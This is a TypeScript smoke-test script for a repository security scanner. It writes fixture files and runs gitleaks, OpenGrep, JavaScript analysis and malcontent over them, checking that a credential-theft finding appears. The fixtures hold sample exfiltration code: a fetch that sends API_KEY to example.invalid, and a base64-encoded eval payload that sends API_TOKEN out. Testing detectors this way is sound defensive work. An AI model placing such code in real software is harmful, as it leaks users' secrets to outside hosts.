import { execFile } from "node:child_process";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";

import { safeCliErrorRecord } from "../src/cli/io.js";
import {
  loadScannerPins,
  loadScannerPolicy,
  ScannerPolicyV4Schema,
} from "../src/config/policy.js";
import { inventoryRepository } from "../src/inventory/inventory-handler.js";
import { ProcessCommandRunner } from "../src/process/command-runner.js";
import { runGitleaks } from "../src/scanners/gitleaks.js";
import { runJavascriptAnalysis } from "../src/scanners/javascript-analysis.js";
import { selectJavascriptCandidates } from "../src/scanners/javascript-candidates.js";
import { runMalcontent } from "../src/scanners/malcontent.js";
import { runOpenGrep } from "../src/scanners/opengrep.js";
import { ScannerError } from "../src/scanners/types.js";
import { resolveToolsDirectory } from "./verify-scanners.mjs";

const execFileAsync = promisify(execFile);
const scriptPath = fileURLToPath(import.meta.url);
const repositoryRoot = resolve(dirname(scriptPath), "..");

async function git(root: string, args: string[]) {
  return execFileAsync("git", args, {
    cwd: root,
    env: {
      PATH: process.env.PATH,
      GIT_CONFIG_NOSYSTEM: "1",
      GIT_TERMINAL_PROMPT: "0",
    },
    timeout: 30_000,
    windowsHide: true,
  });
}

async function main() {
  if (process.platform !== "linux" || process.arch !== "x64")
    throw new Error("Scanner adapter smoke testing requires Linux x64.");
  const pins = await loadScannerPins(
    join(repositoryRoot, "config", "scanners.v1.json"),
  );
  const policy = ScannerPolicyV4Schema.parse(
    await loadScannerPolicy(
      join(repositoryRoot, "config", "scanner-policy.v4.json"),
    ),
  );
  const toolsDir = resolveToolsDirectory();
  const fixture = await mkdtemp(join(tmpdir(), "tavernkeeper-scanner-smoke-"));
  try {
    await mkdir(join(fixture, "src"));
    await writeFile(
      join(fixture, "src", "index.js"),
      [
        "const credential = process.env.API_KEY;",
        'fetch("https://example.invalid/report", { body: credential });',
        "",
      ].join("\n"),
    );
    await writeFile(join(fixture, "src", "harmless.txt"), "hello tavern\n");
    await writeFile(
      join(fixture, "src", "encoded.min.js"),
      'eval(atob("Y29uc3QgY3JlZGVudGlhbD1wcm9jZXNzLmVudi5BUElfVE9LRU47ZmV0Y2goZW5kcG9pbnQse2JvZHk6Y3JlZGVudGlhbH0p"));\n',
    );
    await writeFile(
      join(fixture, "src", "bundle.js"),
      await readFile(
        join(
          repositoryRoot,
          "tests",
          "fixtures",
          "javascript-analysis",
          "webpack-hidden.js",
        ),
      ),
    );
    await git(fixture, ["init", "--quiet"]);
    await git(fixture, ["config", "user.name", "TavernKeeper CI"]);
    await git(fixture, ["config", "user.email", "ci@invalid.example"]);
    await git(fixture, ["add", "--", "src"]);
    await git(fixture, ["commit", "--quiet", "-m", "scanner fixture"]);
    const targetSha = (await git(fixture, ["rev-parse", "HEAD"])).stdout.trim();
    const runner = new ProcessCommandRunner();

    const gitleaks = await runGitleaks({
      root: fixture,
      history: { baseSha: null, targetSha, commits: 1 },
      runner,
      executable: join(toolsDir, "bin", "gitleaks"),
      version: pins.gitleaks.version,
      temporaryRoot: join(toolsDir, "tmp"),
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${gitleaks.name} (${gitleaks.findings.length} findings).\n`,
    );

    const rulesRoot = join(repositoryRoot, "rules", "opengrep");
    const inventory = await inventoryRepository({
      root: fixture,
      maxFiles: policy.inventory.maxFiles,
      maxTotalBytes: policy.inventory.maxTotalBytes,
      maxFileBytes: policy.inventory.maxFileBytes,
    });
    if (!inventory.ok)
      throw new Error("Scanner smoke inventory did not complete.");
    const javascriptPaths = selectJavascriptCandidates(
      inventory.value.files,
    ).map(({ path }) => path);
    const opengrep = await runOpenGrep({
      root: fixture,
      rulesRoot,
      runner,
      executable: join(toolsDir, "bin", "opengrep"),
      version: pins.opengrep.version,
      expectedPaths: javascriptPaths,
      maxTargetBytes: policy.inventory.maxFileBytes,
      temporaryRoot: join(toolsDir, "tmp"),
    });
    if (opengrep.pathCoverage === undefined)
      throw new Error("OpenGrep smoke omitted path coverage.");
    process.stdout.write(
      `Scanner adapter smoke passed: ${opengrep.name} (${opengrep.findings.length} findings).\n`,
    );

    const javascriptAnalysis = await runJavascriptAnalysis({
      root: fixture,
      inventoryFiles: inventory.value.files,
      rawOpenGrepCoverage: opengrep.pathCoverage,
      runner,
      rulesRoot,
      policy,
      temporaryRoot: join(toolsDir, "tmp"),
      opengrepVersion: pins.opengrep.version,
      opengrepExecutable: join(toolsDir, "bin", "opengrep"),
    });
    const coverage = javascriptAnalysis.javascriptAnalysis;
    const rawPathsAccounted =
      opengrep.pathCoverage.scanned.length +
      opengrep.pathCoverage.skipped.length;
    if (
      coverage === undefined ||
      coverage.status !== "complete" ||
      rawPathsAccounted !== javascriptPaths.length ||
      coverage.representations.raw !== javascriptPaths.length ||
      coverage.representations.decoded < 1 ||
      coverage.representations.normalized < 1 ||
      coverage.representations.bundle_modules < 1 ||
      !javascriptAnalysis.findings.some(
        ({ category }) => category === "credential-theft",
      )
    )
      throw new Error(
        "JavaScript smoke did not prove raw, decoded, and bundle-module coverage.",
      );
    process.stdout.write(
      `Scanner adapter smoke passed: ${javascriptAnalysis.name} (${javascriptAnalysis.findings.length} findings; ${coverage.representations.raw} raw, ${coverage.representations.decoded} decoded, ${coverage.representations.bundle_modules} bundle modules).\n`,
    );
    process.stdout.write(
      `${JSON.stringify({
        raw_paths_accounted: rawPathsAccounted,
        javascript_candidates: javascriptPaths.length,
        decoded_representations: coverage.representations.decoded,
        normalized_representations: coverage.representations.normalized,
        bundle_modules: coverage.representations.bundle_modules,
        javascript_coverage: coverage.status,
      })}\n`,
    );

    const malcontent = await runMalcontent({
      root: fixture,
      inputs: [
        {
          path: "src/harmless.txt",
          bytes: 13,
          sha256: "0".repeat(64),
          kind: "text",
        },
      ],
      runner,
      executable: join(toolsDir, "bin", "malcontent"),
      version: pins.malcontent.version,
      temporaryRoot: join(toolsDir, "tmp"),
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${malcontent.name} (${malcontent.findings.length} findings).\n`,
    );
  } finally {
    await rm(fixture, { recursive: true, force: true });
  }
}

if (process.argv[1] && resolve(process.argv[1]) === scriptPath) {
  main().catch((error: unknown) => {
    process.stderr.write(
      `${JSON.stringify({
        ...safeCliErrorRecord(error),
        ...(error instanceof ScannerError ? { diagnostic: error.message } : {}),
      })}\n`,
    );
    process.exitCode = 1;
  });
}
